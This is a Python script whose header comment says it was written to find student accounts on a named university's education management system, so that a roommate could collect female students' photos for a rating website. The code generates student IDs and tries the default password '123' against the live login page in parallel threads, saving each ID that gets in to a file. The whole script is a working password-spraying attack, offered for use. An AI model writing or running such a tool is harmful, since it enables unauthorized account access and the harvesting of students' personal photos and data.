#! /usr/bin/python
# encoding: utf-8
#
# 0x01_give_me_some_accounts.py
#
# This day, one of Huang's roommate ask Huang for some accessable accounts in
# the Education Management System(http://jwgl.cust.edu.cn). Because this guy
# wants to get some girl's photos in thier University, he is panning to build a
# website similar to "Face Match" (The predecessor of FaceBook, which show two
# photos of girl at once time and let visitors choose which is prettier). Our
# Huang is too warmheartedness to refuse him. So he write this script.
#
# This script can search the Education Management System to find all students
# who keep the default password then create "list.txt" file store these
# login IDs.

import threading
import httplib2
from urllib import urlencode

def setData():
    global password, years, uidRange, uidStartList, classLength, current, lock1, lock2, threads

    # The number of threads
    threads = 10

    # Default password
    password = '123'

    # The maxium number of people in each classes
    classLength = 40

    # The entering year of each grade
    years = [12, 13, 14, 15]

    # Major_ID: [number_of_classes_in_grade_4, in_grade_3, in_grade_2, in_grade_1]
    uidRange = {
        111: [2, 2, 1, 1],
        112: [0, 0, 1, 1],
        121: [5, 7, 8, 6],
        122: [1, 2, 2, 2],
        131: [3, 4, 3, 2],
        132: [2, 3, 2, 2],
        133: [4, 0, 0, 0],
        211: [5, 5, 6, 6],
        212: [7, 8, 8, 7],
        221: [1, 1, 2, 1],
        222: [2, 2, 1, 1],
        311: [6, 6, 7, 7],
        321: [5, 5, 6, 6],
        331: [2, 3, 2, 2],
        411: [5, 4, 5, 5],
        412: [2, 2, 3, 2],
        421: [5, 5, 5, 4],
        431: [2, 2, 3, 3],
        432: [3, 3, 3, 3],
        511: [6, 8, 7, 7],
        521: [3, 4, 3, 3],
        522: [1, 2, 2, 2],
        611: [3, 5, 4, 3],
        612: [1, 1, 1, 1],
        613: [1, 1, 1, 1],
        621: [1, 1, 1, 1],
        622: [2, 1, 1, 1],
        623: [1, 2, 2, 1],
        624: [1, 1, 1, 1],
        711: [3, 3, 3, 3],
        712: [1, 1, 1, 1],
        721: [1, 0, 0, 0],
        722: [1, 2, 1, 1],
        811: [2, 2, 2, 2],
        821: [2, 2, 2, 1],
        822: [1, 1, 1, 1],
        911: [1, 1, 1, 1],
        912: [1, 1, 1, 1],
        913: [3, 3, 3, 2],
        921: [2, 2, 1, 1],
        922: [3, 2, 3, 3],
        923: [0, 0, 2, 1],
        924: [1, 1, 1, 1],
        925: [1, 1, 1, 1],
        1011: [4, 4, 4, 3],
        1012: [2, 2, 2, 2],
        1013: [1, 1, 1, 1],
        1014: [2, 2, 2, 2],
        1111: [2, 2, 2, 2],
        1112: [2, 2, 1, 1],
        1121: [2, 2, 2, 2],
        1131: [2, 1, 1, 1],
        1132: [2, 2, 2, 2],
        1133: [0, 1, 1, 1],
        1211: [2, 2, 2, 2],
        1221: [2, 2, 2, 2]
    }
    uidStartList = []
    current = -1
    lock1 = threading.Lock()
    lock2 = threading.Lock()
    for key in uidRange:
        for i in range(0, 4):
            for j in range(1, uidRange[key][i] + 1):
                uidStartList.append(years[i] * 10000000 + key * 1000 + j * 100)

def login(uid, password):
    header = {
        'Connection': 'keep-alive',
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.57 Safari/537.17',
        'Accept-Encoding': 'gzip, deflate, sdch',
        'Accept-Language': 'en-US,en;q=0.8',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    h = httplib2.Http(timeout = 7)
    try:
        resp, content = h.request('http://jwgl.cust.edu.cn/teachweb/', 'GET', headers = header)
        header['Cookie'] = resp['set-cookie'].split(';')[0]
        param = {
            '__VIEWSTATE': 'dDwtMTgyOTgzNjM1MDt0PDtsPGk8MT47PjtsPHQ8O2w8aTwxPjs+O2w8dDxwPHA8bDxCYWNrSW1hZ2VVcmw7PjtsPGltYWdlcy93MS5naWY7Pj47PjtsPGk8MT47PjtsPHQ8cDxwPGw8VGV4dDs+O2w854mI5pysOjMuNC45MTIyNjc7Pj47cDxsPHN0eWxlOz47bDxwYWRkaW5nLXJpZ2h0OjEwXDs7Pj4+Ozs+Oz4+Oz4+Oz4+O2w8cm9sZTE7cm9sZTI7cm9sZTI7cm9sZTU7cm9sZTU7cm9sZTY7cm9sZTY7cm9sZTQ7cm9sZTQ7cm9sZTc7cm9sZTc7Pj5e73ClAxS3uXrzFbdUbSw7Ehm0iw==',
            'role': 'role1',
            'Username': uid,
            'Password': password,
            'BtnLogin': '登 录'
        }
        param = urlencode(param)
        resp, content = h.request('http://jwgl.cust.edu.cn/teachweb/PreLogin.aspx', 'POST', param, header)
        resp, content = h.request('http://jwgl.cust.edu.cn/teachweb/Login.aspx?username=' + uid + '&password=' + password +'&role=student', 'GET', headers = header)
        if resp['content-location'] == 'http://jwgl.cust.edu.cn/teachweb/index1.aspx':
            return True
        else:
            return False
    except Exception:
        print 'Connection Error!'
        return False

def list(start, length):
    global password, lock1
    for i in range(start + 1, start + length + 1):
        if login('%d' %i, password):
            lock1.acquire()
            print 'UID: ' + '%d' %i + ' PASS: ' + password
            print 'Access Gained!\n'
            f = file('list.txt', 'a')
            f.write('%d' %i + '\n')
            f.close()
            lock1.release()
        else:
            lock1.acquire()
            print 'UID: ' + '%d' %i + ' PASS: ' + password
            print 'Access Denied\n'
            lock1.release()

def getNext():
    global current, uidStartList, lock2
    lock2.acquire()
    current += 1
    if current >= len(uidStartList):
        lock2.release()
        return False
    else:
        lock2.release()
        return uidStartList[current]

class Cracker(threading.Thread):
    def run(self):
        global classLength
        classStart = getNext()
        while classStart:
            list(classStart, classLength)
            classStart = getNext()
        return

if __name__ == '__main__':
    setData()
    print 'Cracking Starting ...'
    global threads
    for i in range(0,threads):
        Cracker().start()
